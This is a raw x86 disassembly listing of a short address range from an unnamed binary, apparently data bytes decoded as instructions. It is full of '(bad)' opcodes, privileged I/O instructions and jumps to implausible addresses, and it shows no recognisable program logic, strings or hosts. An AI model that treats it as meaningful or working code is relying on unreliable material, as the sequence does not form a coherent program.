  416ffd:	xor    esi,DWORD PTR [ebp+0x59]
  417000:	inc    eax
  417001:	add    ecx,DWORD PTR ds:0x4d7f4049
  417007:	(bad)  
  417008:	fbstp  TBYTE PTR [eax]
  41700a:	dec    ebp
  41700b:	aas    
  41700c:	shr    BYTE PTR [esi+0x30e7000d],0x40
  417013:	cmp    dl,BYTE PTR [esi]
  417015:	ja     0x416fe8
  417017:	sbb    eax,DWORD PTR [eax]
  417019:	add    eax,0x5cf630d9
  41701e:	int    0x1b
  417020:	and    al,0x39
  417022:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417023:	imul   esp,DWORD PTR [ecx+edx*8],0xffffff97
  417027:	imul   esp,DWORD PTR [eax*8-0x26db9469],0xffffffe6
  41702f:	cmp    edi,DWORD PTR [esi-0x3f83f118]
  417035:	ins    BYTE PTR es:[edi],dx
  417036:	dec    ebp
  417037:	sbb    al,0x1c
  417039:	out    0x72,al
  41703b:	jle    0x41703d
  41703d:	jmp    0xb9735350
  417042:	pop    ebx
  417043:	cmp    al,0x24
  417045:	std    
  417046:	mov    dh,0x72
  417048:	mov    esp,0xc07c0ee8
  41704d:	aad    0x60
  41704f:	jecxz  0x4170c5
  417051:	or     eax,0x0
	...
  41706e:	add    BYTE PTR [eax],al
  417070:	sbb    eax,0x5054477
  417075:	fcomp  st(6)
  417077:	sbb    al,0xe
  417079:	add    BYTE PTR [edi],ah
  41707b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41707c:	or     cl,BYTE PTR [eax]
  41707e:	cmp    DWORD PTR [edi],ebp
  417080:	sub    edx,DWORD PTR [eax-0x77]
  417083:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417084:	cli    
  417085:	pop    es
  417086:	push   0xffffffc4
  417088:	(bad)  
  41708a:	push   edi
  41708b:	push   ss
  41708c:	jle    0x4170b5
  41708e:	(bad)  
  41708f:	jl     0x417060
  417091:	js     0x417107
  417093:	lds    ebx,FWORD PTR [esi]
  417095:	daa    
  417096:	(bad)  
  417097:	jg     0x4170a3
  417099:	ja     0x417117
  41709b:	lds    ebx,FWORD PTR [edx]
  41709d:	ja     0x41708f
  41709f:	out    0xdd,al
  4170a1:	sti    
  4170a2:	out    0xd2,eax
  4170a4:	loopne 0x417086
  4170a6:	std    
  4170a7:	ins    DWORD PTR es:[edi],dx
  4170a8:	dec    esi
  4170a9:	ins    BYTE PTR es:[edi],dx
  4170aa:	add    al,0xce
  4170ac:	or     bl,BYTE PTR [eax+edx*1]
  4170af:	add    BYTE PTR [edi+0x14e29a3],dh
  4170b5:	(bad)  
  4170b6:	sti    
  4170b7:	je     0x4170b9
  4170b9:	adc    al,ch
  4170bb:	inc    eax
  4170bc:	int    0xfc
  4170be:	dec    DWORD PTR [eax+esi*8-0x6917e3e1]
  4170c5:	xchg   esi,eax
  4170c6:	std    
  4170c7:	push   DWORD PTR [edi]
  4170c9:	mov    ebp,0xcd07435
  4170ce:	or     edx,DWORD PTR [esp+esi*4+0xff14c7]
	...
  4170f1:	add    BYTE PTR [eax],al
  4170f3:	add    DWORD PTR [eax+ebp*8],edx
  4170f6:	mov    DWORD PTR [ebp-0x3],0x242149ff
  4170fd:	sbb    al,0x3c
  4170ff:	push   edx
  417100:	mov    edx,0xc367e401
  417105:	pop    edi
  417106:	call   0x51bf:0x79e58737
  41710d:	mov    ebx,DWORD PTR [eax+0x7e]
  417110:	in     al,dx
  417111:	test   BYTE PTR [edx-0x48ad0004],dh
  417117:	mov    bh,0x56
  417119:	push   edi
  41711a:	sub    eax,0xc989e03a
  41711f:	rol    BYTE PTR [ebp+0x5965f45d],0xf4
  417126:	sub    eax,0xb989c43a
  41712b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41712c:	test   DWORD PTR [ebp+0x20],ebx
  41712f:	sbb    BYTE PTR [edi-0x7414558c],bh
  417135:	xchg   ebp,eax
  417136:	fs cld 
  417138:	inc    DWORD PTR [edx+0x167dff5c]
  41713e:	test   ebx,0x74f10eff
  417144:	add    BYTE PTR [eax],al
  417146:	or     eax,0x1973e2d7
  41714b:	inc    esp
  41714c:	inc    edi
  41714d:	lock xor eax,0x3aff8efc
  417153:	int    0x5e
  417155:	mov    DWORD PTR [eax],eax
	...
  417173:	add    al,al
  417175:	fimul  WORD PTR [esi-0x74a1eeb9]
  41717b:	nop
  41717c:	or     al,0xd7
  41717e:	add    DWORD PTR [ecx-0x6bed2beb],eax
  417184:	dec    ebp
  417185:	pop    esi
  417186:	inc    edi
  417187:	mov    ah,0x98
  417189:	and    al,0xb0
  41718b:	push   eax
  41718c:	nop
  41718d:	cld    
  41718e:	ror    DWORD PTR [edi-0x7c],cl
  417191:	sub    al,0xb0
  417193:	xchg   DWORD PTR [eax+0x19],ebx
  417196:	mov    ebx,DWORD PTR [ebx-0x5b]
  417199:	cmp    ecx,0xeee90d73
  41719f:	dec    ebx
  4171a0:	mov    BYTE PTR [esp+eax*4-0x9],bh
  4171a4:	shl    BYTE PTR [esi],cl
  4171a6:	in     al,dx
  4171a7:	pop    ecx
  4171a8:	loope  0x417192
  4171aa:	add    DWORD PTR [ebx-0x224df80],ecx
  4171b0:	mov    edx,0x19e84726
  4171b5:	jmp    0x54d971bb
  4171ba:	jo     0x4171b9
  4171bc:	mov    ds:0x7cb4ec26,al
  4171c1:	call   0x624ddbc7
  4171c6:	retf   0xd88b
  4171c9:	clc    
  4171ca:	jmp    0x417175
  4171cc:	nop
  4171cd:	call   0xcc93f2d3
  4171d2:	loop   0x41721f
  4171d4:	gs pop esp
  4171d6:	in     al,0x68
	...
  4171f4:	add    BYTE PTR [eax],al
  4171f6:	popf   
  4171f7:	in     al,0x1
  4171f9:	add    BYTE PTR [eax+0x62836c00],dl
  4171ff:	(bad)  
  417201:	ss mov ebp,0x2333fcde
  417207:	inc    eax
  417208:	out    0x86,eax
  41720a:	dec    ecx
  41720b:	or     al,0x51
  41720d:	add    eax,0x33b74586
  417212:	test   BYTE PTR [ebp-0x21],al
  417215:	mov    es,ebp
  417217:	add    edi,DWORD PTR [edi-0x18ffabca]
  41721d:	push   ss
  41721e:	and    ebx,DWORD PTR [ecx]
  417220:	adc    al,0xd8
  417222:	sahf   
  417223:	cli    
  417224:	cmp    al,0xec
  417226:	cmp    ch,BYTE PTR [eax-0x18]
  417229:	add    eax,DWORD PTR [eax]
  41722b:	push   ebp
  41722c:	ja     0x417219
  41722e:	xor    ch,BYTE PTR [eax-0x18]
  417231:	add    ebx,DWORD PTR [ebx-0x18]
  417234:	retf   0xea6b
  417237:	fidivr WORD PTR [ecx-0x1649153d]
  41723d:	add    ecx,DWORD PTR ds:0x8abfd489
  417243:	push   esp
  417244:	inc    ebx
  417245:	jmp    0x4171fb
  417247:	outs   dx,DWORD PTR ds:[esi]
  417248:	call   0x8385fc50
  41724d:	xchg   BYTE PTR [esi],dh
  41724f:	in     al,0xe8
  417251:	leave  
  417252:	dec    esi
  417253:	(bad)  
  417255:	pusha  
  417256:	push   cs
  417257:	mov    esp,DWORD PTR [edi+edx*8+0x0]
	...
  417276:	add    BYTE PTR [eax],al
  417278:	mov    ah,0x2
  41727a:	xchg   ecx,eax
  41727b:	or     DWORD PTR ds:0x8ab3a489,esi
  417281:	push   esp
  417282:	call   FWORD PTR [ebx]
  417284:	(bad)  
  417285:	rcr    esi,cl
  417287:	xchg   ecx,eax
  417288:	inc    edx
  417289:	add    ah,bh
  41728b:	add    eax,DWORD PTR [esp+edi*1-0xcab91f5]
  417292:	call   FWORD PTR [edi-0x33]
  417295:	mov    bh,0x87
  417297:	je     0x4172eb
  417299:	push   ss
  41729a:	jae    0x417255
  41729c:	cld    
  41729d:	lea    ebp,[ebx+ebp*8]
  4172a0:	push   cs
  4172a1:	add    BYTE PTR [ecx+0x4089192c],cl
  4172a7:	in     eax,0x36
  4172a9:	bswap  esp
  4172ab:	jmp    0xef01f6be
  4172b0:	mov    dh,dh
  4172b2:	add    ecx,ebp
  4172b4:	push   cs
  4172b5:	mov    DWORD PTR [ebx-0x63],edi
  4172b8:	or     BYTE PTR [ebx-0x10],bl
  4172bb:	jo     0x41727f
  4172bd:	xlat   BYTE PTR ds:[ebx]
  4172be:	xchg   DWORD PTR [eiz*2+0x67857316],ebx
  4172c5:	and    ecx,DWORD PTR [ecx+0x146acd14]
  4172cb:	je     0x417311
  4172cd:	or     BYTE PTR [esi+0x19],dl
  4172d0:	in     al,dx
  4172d1:	icebp  
  4172d2:	push   edi
  4172d3:	fisttp WORD PTR [esi+0x0]
  4172d6:	and    DWORD PTR [ebp-0x223f7f03],0x0
	...
  4172f8:	add    BYTE PTR [eax],al
  4172fa:	cld    
  4172fb:	fiadd  DWORD PTR [ebx+0x61]
  4172fe:	add    BYTE PTR [ecx-0x8],0x6a
  417302:	xlat   BYTE PTR ds:[ebx]
  417303:	hlt    
  417304:	cmp    BYTE PTR [edx+esi*4-0x2b0521ae],ah
  41730b:	xchg   DWORD PTR [ebx+0x4d],eax
  41730e:	push   ss
  41730f:	inc    ecx
  417310:	clc    
  417311:	out    0x93,al
  417313:	ret    0xe8ff
  417316:	push   cs
  417317:	sbb    DWORD PTR [esi+0xd000ee9],edx
  41731d:	push   0xffffffc3
  41731f:	(bad)  
  417321:	jmp    0x5c55bac1
  417326:	fidivr DWORD PTR [ebx+0x69dd00e8]
  41732c:	std    
  41732d:	(bad)  
  41732e:	call   0x8e5fe7f6
  417333:	aad    0x8a
  417335:	inc    edi
  417336:	ins    BYTE PTR es:[edi],dx
  417337:	adc    DWORD PTR [edi-0x40fbafbb],eax
  41733d:	push   eax
  41733e:	xor    edx,esi
  417340:	dec    ecx
  417341:	push   ss
  417342:	hlt    
  417343:	add    edi,DWORD PTR [edi-0x3c]
  417346:	pusha  
  417347:	loopne 0x41738a
  417349:	in     al,dx
  41734a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41734b:	ret    
  41734c:	adc    al,0x89
  41734e:	adc    DWORD PTR [ecx+ecx*4-0x76ebd3a1],ebx
  417355:	jne    0x4173ab
  417357:	mov    bl,BYTE PTR [ecx-0x58]
  41735a:	jl     0x4173b4
  41735c:	mov    es,WORD PTR [ecx]
	...
  41737a:	add    BYTE PTR [eax],al
  41737c:	and    al,0x86
  41737e:	ror    BYTE PTR [edi],0x6d
  417381:	dec    edi
  417382:	std    
  417383:	push   esp
  417385:	adc    ebp,eax
  417387:	dec    edx
  417388:	push   esp
  417389:	add    al,BYTE PTR [eax]
  41738b:	test   BYTE PTR [edi+ebp*8+0xf56080],ah
  417392:	add    BYTE PTR [ebx-0x17317455],cl
  417398:	jmp    0xbc1:0x68fffd8b
  41739f:	test   DWORD PTR [ebx+0x1],esi
  4173a2:	add    BYTE PTR [eax],al
  4173a4:	aaa    
  4173a5:	dec    esi
  4173a6:	sar    bh,0x27
  4173a9:	ds in  al,0x32
  4173ac:	jo     0x417383
  4173ae:	cld    
  4173af:	jne    0x4173d1
  4173b1:	mov    WORD PTR [edi-0x2914918],?
  4173b7:	call   FWORD PTR ds:0xe485c046
  4173bd:	out    dx,eax
  4173be:	xchg   DWORD PTR [eax],esi
  4173c0:	or     eax,0x960001e8
  4173c5:	mov    ds:0xeacd8909,eax
  4173ca:	mov    WORD PTR [eax+0x1e78d],?
  4173d0:	push   0xffffffa3
  4173d2:	mov    cl,0x6a
  4173d4:	stc    
  4173d5:	cmp    eax,DWORD PTR [esi-0x78]
  4173d8:	mov    esi,0xc113dd16
  4173dd:	aam    0x41
	...
  4173fb:	add    BYTE PTR [eax],al
  4173fd:	add    BYTE PTR [esi+0xc6a10aa],cl
  417403:	inc    ecx
  417404:	or     al,0x8b
  417406:	shl    BYTE PTR [edx+0x34],1
  417409:	call   0x4641cf
  41740e:	mov    bh,0xe7
  417410:	addr16 sbb al,0x90
  417413:	and    ecx,DWORD PTR [eax+edx*2+0x67e6a7]
  41741a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41741b:	call   0x653739aa
  417420:	ret    
  417421:	inc    DWORD PTR [edx]
  417423:	pop    edi
  417424:	mov    esp,0x85d2d683
  417429:	jecxz  0x417438
  41742b:	jmp    0x8fc6dc31
  417430:	add    DWORD PTR [eax],eax
  417432:	loop   0x4173c7
  417434:	jmp    0x22b469e
  417439:	xchg   DWORD PTR [eax+0x61],ecx
  41743c:	cmp    eax,0x890db40c
  417442:	mov    esi,0xd782841
  417447:	jmp    0x2ef6b7d6
  41744c:	popa   
  41744d:	mov    DWORD PTR [esi-0x67],edx
  417450:	mov    bh,BYTE PTR [edi]
  417452:	std    
  417453:	arpl   sp,ax
  417455:	jae    0x417468
  417457:	add    dl,bl
  417459:	aad    0xa4
  41745b:	jmp    FWORD PTR [ebx+0x54]
  41745e:	cmp    eax,ebp
  417460:	pop    eax
  417461:	jo     0x417463
	...
  41747f:	add    BYTE PTR [edx+0x4d96dedb],al
  417485:	test   ebp,edi
  417487:	push   edi
  417488:	xor    DWORD PTR [esi-0x34],esp
  41748b:	adc    bh,BYTE PTR [edi]
  41748d:	cmp    esi,edi
  41748f:	aam    0x8e
  417491:	scas   al,BYTE PTR es:[edi]
  417492:	je     0x4174a8
  417494:	or     BYTE PTR [ebx+0x624a12a7],dl
  41749a:	and    cl,ah
  41749c:	mov    esp,0x8add6222
  4174a1:	inc    ebp
  4174a2:	iret   
  4174a3:	nop
  4174a4:	jle    0x4174ba
  4174a6:	(bad)  
  4174a7:	fidiv  WORD PTR [eax]
  4174a9:	call   0xdb6c0317
  4174ae:	inc    ecx
  4174af:	add    eax,0x505cc294
  4174b4:	push   ecx
  4174b5:	call   0xdb53ffda
  4174ba:	push   0xffffffc6
  4174bc:	(bad)  ss:[esp+ebx*8]
  4174c0:	jle    0x4174a3
  4174c2:	bound  esp,QWORD PTR [eax-0x4f]
  4174c5:	xchg   BYTE PTR [edx-0x15],bh
  4174c8:	mov    al,0x52
  4174ca:	out    0x3,eax
  4174cc:	sbb    al,0xc0
  4174ce:	daa    
  4174cf:	adc    ebx,ebx
  4174d1:	inc    ecx
  4174d2:	mov    dl,0xc5
  4174d4:	pop    ecx
  4174d5:	aaa    
  4174d6:	jb     0x417520
  4174d8:	add    eax,0x9407af87
  4174dd:	mov    BYTE PTR [edi+0x4],ah
  4174e0:	or     eax,0x36b500
	...
  417501:	add    BYTE PTR [ecx+eax*8-0x24ceb6b1],al
  417508:	mov    dl,BYTE PTR ds:[esi-0x40]
  41750c:	add    BYTE PTR [edx-0x35],ah
  41750f:	jle    0x4174d8
  417511:	mov    al,0x7
  417513:	xor    cl,BYTE PTR [ebx+0x36e7aeb4]
  417519:	jb     0x41752c
  41751b:	add    cl,ch
  41751d:	loope  0x4174bc
  41751f:	ss loopne 0x417523
  417522:	lods   al,BYTE PTR ds:[esi]
  417523:	mov    bh,bh
  417525:	call   0xc7b634b4
  41752a:	xchg   edi,eax
  41752b:	dec    esi
  41752c:	or     al,0x2f
  41752e:	aad    0xdc
  417530:	jmp    DWORD PTR [ebx+0x40]
  417533:	push   ebx
  417534:	or     al,0xe6
  417536:	mov    edx,0x9a15e8a7
  41753b:	(bad)  
  41753d:	ins    BYTE PTR es:[edi],dx
  41753e:	dec    ecx
  41753f:	push   edx
  417540:	or     eax,0xe8dfca5c
  417545:	pushf  
  417546:	sbb    edx,0xbb26afd
  41754c:	add    BYTE PTR [esi+0xc89b3ca],dh
  417552:	pop    ecx
  417553:	adc    dh,dh
  417555:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417556:	retf   0x89e7
  417559:	and    al,0xf9
  41755b:	jg     0x4175a0
  41755d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41755e:	and    DWORD PTR [edi],edx
  417560:	inc    ebx
  417561:	xchg   ebp,eax
  417562:	or     BYTE PTR [ecx+ecx*8+0x84],cl
	...
  417581:	add    BYTE PTR [eax],al
  417583:	add    al,dl
  417585:	(bad)  
  417587:	hlt    
  417588:	mov    esi,0xe0ca4e8
  41758d:	add    BYTE PTR [ecx+0x4387ad14],cl
  417593:	xor    DWORD PTR [ebp+eax*2-0x6bfd8f3c],eax
  41759a:	mov    edi,DWORD PTR [edx+ebx*4+0x73a8682e]
  4175a1:	add    BYTE PTR ds:[eax],al
  4175a4:	fdivrp st(5),st
  4175a6:	dec    edi
  4175a7:	push   ecx
  4175a8:	sbb    eax,0x7189f049
  4175ad:	mov    cl,0x85
  4175af:	jne    0x4175a1
  4175b1:	test   BYTE PTR [ecx-0x38],dh
  4175b4:	loop   0x4175f6
  4175b6:	mov    eax,0x4b0b1c01
  4175bb:	add    dh,BYTE PTR [eax+eax*4-0x3c]
  4175bf:	adc    al,0xe4
  4175c1:	cmp    bl,bh
  4175c3:	add    DWORD PTR [ebx-0x7f],edi
  4175c6:	push   edi
  4175c7:	std    
  4175c8:	imul   edi,DWORD PTR [ebx+edi*8+0x5debf875],0x65
  4175d0:	gs std 
  4175d2:	push   ebp
  4175d3:	call   0x3ed6a7
  4175d8:	imul   esi,DWORD PTR [edx],0xfffffff0
  4175db:	call   0x3ed6e7
  4175e0:	dec    ebx
  4175e1:	xor    ah,al
  4175e3:	call   0x3ed6e7
	...
  417604:	add    BYTE PTR [eax],al
  417606:	or     eax,0xbb0fd431
  41760b:	mov    esp,0xc4ff5e5b
  417610:	ret    0x2408
  417613:	adc    al,BYTE PTR [edi-0x71e8814]
  417619:	or     DWORD PTR [eax+0x425550d4],0x13
  417620:	xchg   ecx,edi
  417622:	mov    edx,ecx
  417624:	adc    eax,0x85043413
  417629:	inc    esp
  41762a:	rcr    al,1
  41762c:	mov    BYTE PTR [edi-0x10],al
  41762f:	ja     0x4175c5
  417631:	add    esp,esp
  417633:	cld    
  417634:	inc    dl
  417636:	test   BYTE PTR [ebx-0x2af2e7ef],bh
  41763c:	inc    ecx
  41763d:	add    BYTE PTR [ebp-0x4d007b92],ah
  417643:	dec    ebp
  417644:	shl    DWORD PTR [ecx],1
  417646:	mov    eax,0x3c73d4fd
  41764b:	jl     0x417681
  41764d:	xor    ebp,ecx
  41764f:	ds out dx,al
  417651:	stc    
  417652:	xchg   edx,eax
  417653:	and    DWORD PTR [ebp+0x36c200c0],eax
  417659:	xor    DWORD PTR [ebp-0x67],ecx
  41765c:	inc    ecx
  41765d:	call   0xfe1d63bc
  417662:	mov    DWORD PTR [esi],esp
  417664:	push   esi
  417665:	pop    ss
  417666:	xchg   esi,eax
  417667:	mov    eax,ds:0x8905
	...
  417688:	lea    esi,[esi]
  41768a:	add    al,BYTE PTR [eax]
  41768c:	or     eax,0x425c17f
  417691:	out    0x31,eax
  417693:	std    
  417694:	and    bl,bl
  417696:	idiv   BYTE PTR [edi]
  417698:	or     eax,0x2074c46c
  41769d:	retf   0x17ef
  4176a0:	push   ds
  4176a1:	daa    
  4176a2:	add    al,0x87
  4176a4:	rol    DWORD PTR [edx],1
  4176a6:	clc    
  4176a7:	out    0xb0,eax
  4176a9:	imul   eax,DWORD PTR [ebx],0x1d968600
  4176af:	repz cdq 
  4176b1:	cmp    DWORD PTR ds:0x775d1af3,ebx
  4176b7:	inc    DWORD PTR [edx]
  4176b9:	jmp    0xff8c:0x8be5c68e
  4176c0:	repnz dec esp
  4176c2:	inc    eax
  4176c3:	and    al,0x31
  4176c5:	stc    
  4176c6:	rol    DWORD PTR [ecx+ebp*1-0x4e],0x1
  4176cb:	xchg   DWORD PTR [ecx-0x43],ebp
  4176ce:	sbb    eax,0x8200a6e8
  4176d3:	fcmovne st,st(0)
  4176d5:	sbb    esp,DWORD PTR [eax+edx*2]
  4176d8:	pop    ds
  4176d9:	xor    BYTE PTR [edi],bh
  4176db:	jbe    0x41770e
  4176dd:	add    edi,esp
  4176df:	xchg   BYTE PTR [ecx],dh
  4176e1:	sbb    al,0xb
  4176e3:	add    BYTE PTR [eax],bl
  4176e5:	jb     0x41770e
  4176e7:	or     ch,0x4c
  4176ea:	ffreep st(2)
	...
  417708:	add    BYTE PTR [eax],al
  41770a:	push   ecx
  41770b:	sbb    al,0x7
  41770d:	add    eax,0x1ce7000d
  417712:	sti    
  417713:	sti    
  417714:	in     eax,dx
  417715:	mov    DWORD PTR [edx-0x6dfc1900],esi
  41771b:	fs ret 
  41771d:	sti    
  41771e:	test   DWORD PTR [edi],edi
  417720:	jmp    0x41770d
  417722:	pop    ecx
  417723:	enter  0x3e7,0x89
  417727:	shl    dh,0x7f
  41772a:	jbe    0x41772c
  41772c:	out    0x3,eax
  41772e:	test   dh,dh
  417730:	jmp    0x6c39686c
  417735:	inc    esi
  417736:	adc    eax,0x8653bf30
  41773b:	add    edi,esp
  41773d:	jg     0x41778c
  41773f:	dec    ebp
  417740:	dec    esi
  417741:	mov    ecx,ss
  417743:	sbb    edx,ebp
  417745:	and    DWORD PTR [ecx-0x5cfc22e5],0xfffffff8
  41774c:	popa   
  41774d:	inc    edx
  41774e:	or     DWORD PTR [ebx-0x28f58c99],ecx
  417754:	out    0x6b,eax
  417756:	xchg   ebp,eax
  417757:	repnz out 0x3,al
  41775a:	pop    ebp
  41775b:	xlat   BYTE PTR ds:[ebx]
  41775c:	hlt    
  41775d:	neg    DWORD PTR ds:0xcd80e740
  417763:	dec    ebx
  417764:	mov    ebx,0xfffc488e
  417769:	popa   
  41776a:	xchg   BYTE PTR [edi-0x1],bh
  41776d:	call   0x417772
	...
  41778a:	add    BYTE PTR [eax],al
  41778c:	push   cs
  41778d:	mov    DWORD PTR [ebp+ecx*1-0xf],eax
  417791:	imul   edi,edi,0x7a32b6b9
  417797:	push   esi
  417798:	xlat   BYTE PTR ds:[ebx]
  417799:	add    al,0xd0
  41779c:	mov    esp,0x118a55de
  4177a1:	add    BYTE PTR [ecx+ebp*1-0x520205ae],al
  4177a8:	cli    
  4177a9:	in     eax,dx
  4177aa:	jg     0x417759
  4177ac:	repnz in eax,dx
  4177ae:	add    bl,BYTE PTR [ebx+0x110be8a3]
  4177b4:	jae    0x417758
  4177b6:	(bad)  
  4177b7:	call   0x2745b845
  4177bc:	xor    bl,BYTE PTR [edx*1+0x24538ee8]
  4177c3:	xlat   BYTE PTR ds:[ebx]
  4177c4:	or     eax,0x4d621453
  4177c9:	mov    dh,cl
  4177cb:	add    DWORD PTR [ecx-0x2c170077],esp
  4177d1:	sub    BYTE PTR [ebp+eax*1+0x41],0xe
  4177d6:	(bad)  
  4177d7:	sub    eax,0x69feeced
  4177dc:	int    0x1b
  4177de:	sbb    BYTE PTR [ecx],al
  4177e0:	jmp    0x5184:0x15e56e18
  4177e7:	mov    dh,0x34
  4177e9:	aam    0x89
  4177eb:	push   cs
  4177ec:	or     eax,0x3f026a
	...
  41780d:	add    cl,bh
  41780f:	mov    dh,0xe9
  417812:	push   cs
  417813:	jl     0x4177d5
  417815:	sbb    eax,0xc544bbfa
  41781a:	std    
  41781b:	(bad)  
  41781c:	xor    al,BYTE PTR [eax]
  41781e:	scas   eax,DWORD PTR es:[edi]
  41781f:	hlt    
  417820:	pop    ebx
  417821:	and    al,0xbb
  417823:	inc    ebp
  417824:	add    ecx,DWORD PTR [ebx-0x79581b4e]
  41782a:	in     eax,0x1
  41782c:	xchg   DWORD PTR [esi-0x48],eax
  41782f:	jl     0x417829
  417831:	xor    ah,cl
  417833:	hlt    
  417834:	jle    0x41782e
  417836:	mov    ebp,0xb9ff402e
  41783b:	fst    DWORD PTR [eax]
  41783d:	inc    eax
  41783e:	mov    ah,0x24
  417840:	inc    esp
  417841:	and    al,0xc0
  417843:	out    dx,al
  417844:	jg     0x417811
  417846:	mov    ah,bh
  417848:	jne    0x417879
  41784a:	jp     0x41785c
  41784c:	push   0x3
  41784e:	dec    esp
  41784f:	jmp    0xb76572bc
  417854:	test   al,al
  417856:	cdq    
  417857:	rcl    BYTE PTR [eax+0x57],1
  41785a:	push   edi
  41785b:	shr    eax,0x5b
  41785e:	push   cs
  41785f:	mov    bh,0xfb
  417861:	test   BYTE PTR [eax*2+0x637b530a],dh
  417868:	add    bl,BYTE PTR [eax+0xc]
  41786b:	cmp    eax,0xb833fffa
  417870:	adc    DWORD PTR [eax],ebx
	...
  41788e:	add    BYTE PTR [eax],al
  417890:	inc    edi
  417891:	inc    ecx
  417892:	add    BYTE PTR [ecx-0xe3e018],cl
  417898:	sbb    ah,ah
  41789a:	dec    ecx
  41789b:	arpl   WORD PTR ds:0xebe85601,si
  4178a1:	pop    edx
  4178a2:	std    
  4178a3:	jmp    FWORD PTR [edi-0x47fafbc1]
  4178a9:	add    DWORD PTR [eax],eax
  4178ab:	add    BYTE PTR [edi+esi*4+0x11],al
  4178af:	sbb    al,0x6
  4178b1:	inc    ecx
  4178b2:	add    BYTE PTR [ebx-0x76ffd9f3],cl
  4178b8:	lea    edx,[esi+0x2]
  4178bb:	add    BYTE PTR ds:0x67543ef,cl
  4178c1:	out    0x31,eax
  4178c3:	std    
  4178c4:	add    BYTE PTR [ebx+0x5c0d3ff4],ch
  4178ca:	ror    DWORD PTR ds:0xfdd63490,0xc2
  4178d1:	xor    DWORD PTR ds:0x4e35289,eax
  4178d7:	rcr    DWORD PTR [ebp+0x46],0xee
  4178db:	sbb    edi,edi
  4178dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4178de:	add    DWORD PTR [ebp+0x43],ebx
  4178e1:	je     0x41791f
  4178e3:	mov    DWORD PTR [eax+0x1181c46b],esi
  4178e9:	sti    
  4178ea:	inc    DWORD PTR [ecx]
  4178ec:	jecxz  0x41793f
  4178ee:	ror    BYTE PTR ds:0x2c4ecebb,cl
	...
  417910:	add    BYTE PTR [eax],al
  417912:	mov    gs,edi
  417914:	or     dh,BYTE PTR [ecx+edx*1+0x6a]
  417918:	fimul  DWORD PTR [ebx]
  41791a:	loopne 0x4178b7
  41791c:	inc    edi
  41791d:	cmp    DWORD PTR [ebx+0x59],ecx
  417920:	or     al,0x80
  417922:	aad    0xe7
  417924:	or     esi,DWORD PTR [ebx+0x8]
  417927:	add    DWORD PTR [ebx],0x12e93658
  41792d:	ror    ch,0x4f
  417930:	add    ch,cl
  417932:	adc    esp,DWORD PTR [esi-0x19cd00fe]
  417938:	add    DWORD PTR [ecx],esi
  41793a:	dec    ebp
  41793b:	es jmp 0xb01077c
  417941:	jl     0x417926
  417943:	imul   ebx,ebx,0x81c1930c
  417949:	neg    DWORD PTR [eax]
  41794b:	add    BYTE PTR [ebx],bl
  41794d:	mov    DWORD PTR [edx+0xd0464d9],0x73fc1b00
  417957:	fld    st(6)
  417959:	and    ecx,DWORD PTR ds:0x63f80500
  41795f:	fnop   
  417961:	and    ecx,DWORD PTR ds:0xc9eff600
  417967:	(bad)  
  417968:	jmp    0x52418670
  41796d:	enter  0xbffc,0x20
  417971:	inc    eax
  417972:	icebp  
  417973:	add    esp,esi
  417975:	jo     0x417977
	...
  417993:	add    ch,cl
  417995:	inc    eax
  417996:	inc    edx
  417997:	mov    ds,esp
  417999:	mov    edi,0x15c1a5
  41799e:	scas   eax,DWORD PTR es:[edi]
  41799f:	sbb    BYTE PTR [ecx],0x1c
  4179a2:	jmp    0x4179a5
  4179a4:	add    BYTE PTR [edx+0x7f2150df],cl
  4179aa:	and    BYTE PTR [edx],cl
  4179ac:	stc    
  4179ad:	cs fcmovb st,st(3)
  4179b0:	mov    ecx,ds
  4179b2:	in     al,0x50
  4179b4:	out    dx,al
  4179b5:	mov    edx,0xd04e9
  4179ba:	out    0xea,eax
  4179bc:	sar    DWORD PTR [esi+0x0],0xa
  4179c0:	loope  0x4179d4
  4179c2:	jne    0x4179e0
  4179c4:	mov    ecx,ds
  4179c6:	fcom   QWORD PTR [ebp-0x7]
  4179c9:	and    al,0x80
  4179cc:	or     eax,0x154fe700
  4179d1:	adc    eax,0xe6ffed1e
  4179d7:	push   ebp
  4179d8:	icebp  
  4179d9:	add    al,0x2c
  4179dc:	in     eax,dx
  4179dd:	jmp    esi
  4179df:	push   esi
  4179e0:	stc    
  4179e1:	mov    edx,0xfeb00
  4179e6:	add    cl,ch
  4179e8:	mul    DWORD PTR [ecx]
  4179ea:	xor    DWORD PTR [ecx-0x12dbc3df],ebp
  4179f0:	adc    ebp,DWORD PTR [edi-0x40]
  4179f3:	sub    esi,esp
  4179f5:	pop    ds
  4179f6:	(bad)
	...
  417a15:	add    BYTE PTR [ecx],dl
  417a17:	add    BYTE PTR [eax],al
  417a19:	jmp    0xa9727015
  417a1e:	out    0xea,eax
  417a20:	cmp    BYTE PTR ds:0xe276082d,ch
  417a26:	mov    ss,WORD PTR [edi-0x3]
  417a29:	hlt    
  417a2a:	pop    ebp
  417a2b:	jmp    FWORD PTR [ecx-0x15]
  417a2e:	imul   al
  417a30:	add    DWORD PTR [edx],ebx
  417a32:	leave  
  417a33:	aas    
  417a34:	xchg   ebx,ebp
  417a36:	(bad)  
  417a37:	mov    edi,0xa2b40
  417a3c:	push   ebx
  417a3d:	jb     0x4179f1
  417a3f:	and    ah,0x31
  417a42:	fild   QWORD PTR [esi]
  417a44:	push   esi
  417a45:	xchg   esi,eax
  417a46:	hlt    
  417a47:	shl    BYTE PTR [ebp-0x17],cl
  417a4a:	ror    BYTE PTR [ecx],cl
  417a4c:	pop    ss
  417a4d:	adc    DWORD PTR [ebx-0x3b],ebx
  417a50:	(bad)  
  417a51:	call   0xfcc561dd
  417a56:	fiadd  DWORD PTR [eax]
  417a58:	inc    eax
  417a59:	adc    dl,ch
  417a5b:	out    0x18,eax
  417a5d:	sub    eax,0x29840011
  417a62:	ret    0x6a13
  417a65:	clc    
  417a66:	pusha  
  417a67:	out    dx,al
  417a68:	addr16 sti 
  417a6a:	into   
  417a6b:	dec    DWORD PTR [edi-0x22]
  417a6e:	sub    dh,BYTE PTR [edx]
